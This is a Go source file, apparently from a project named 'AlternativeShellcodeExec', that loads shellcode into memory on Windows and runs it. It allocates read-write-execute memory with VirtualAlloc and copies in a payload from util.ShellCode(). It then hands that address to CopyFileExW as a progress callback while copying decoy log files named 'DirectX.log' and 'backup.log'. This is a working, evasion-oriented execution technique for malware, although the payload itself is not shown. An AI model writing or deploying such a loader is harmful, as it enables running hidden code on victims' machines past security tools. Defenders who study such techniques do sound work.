package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT               = 0x1000
	PAGE_EXECUTE_READWRITE   = 0x40
	COPY_FILE_FAIL_IF_EXISTS = 0x1
)

func createFileIfNotExist(filepath string) error {
	_, err := os.Stat(filepath)
	if os.IsNotExist(err) {
		file, err := os.Create(filepath)
		if err != nil {
			return err
		}
		file.Close()
	}
	return nil
}

func Run(op []byte) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Error: failed to get user home directory, %v\n", err)
		return
	}

	srcPathStr := filepath.Join(homeDir, "DirectX.log")
	destPathStr := filepath.Join(homeDir, "backup.log")

	err = createFileIfNotExist(srcPathStr)
	if err != nil {
		fmt.Printf("Error: failed to create file %s, %v\n", srcPathStr, err)
		return
	}

	err = createFileIfNotExist(destPathStr)
	if err != nil {
		fmt.Printf("Error: failed to create file %s, %v\n", destPathStr, err)
		return
	}

	kernel32 := syscall.MustLoadDLL("kernel32.dll")

	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlcMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	copyFileExW := kernel32.MustFindProc("CopyFileExW")
	deleteFileW := kernel32.MustFindProc("DeleteFileW")

	addr, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Printf("Error: VirtualAlloc failed with error code %d\n", err)
		return
	}

	_, _, err = rtlcMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&op[0])), uintptr(len(op)))
	if err != syscall.Errno(0) {
		fmt.Printf("Error: RtlMoveMemory failed with error code %d\n", err)
		return
	}

	srcPath, _ := syscall.UTF16PtrFromString(srcPathStr)
	destPath, _ := syscall.UTF16PtrFromString(destPathStr)

	_, _, err = deleteFileW.Call(uintptr(unsafe.Pointer(destPath)))
	if err != syscall.Errno(0) && err != syscall.ERROR_FILE_NOT_FOUND {
		fmt.Printf("Error: DeleteFileW failed with error code %d\n", err)
		return
	}

	_, _, err = copyFileExW.Call(uintptr(unsafe.Pointer(srcPath)), uintptr(unsafe.Pointer(destPath)), addr, 0, 0, COPY_FILE_FAIL_IF_EXISTS)
	if err != syscall.Errno(0) {
		fmt.Printf("Error: CopyFileExW failed with error code %d\n", err)
		return
	}

	fmt.Println("Done.")
}

func main() {
	Run(util.ShellCode())
}
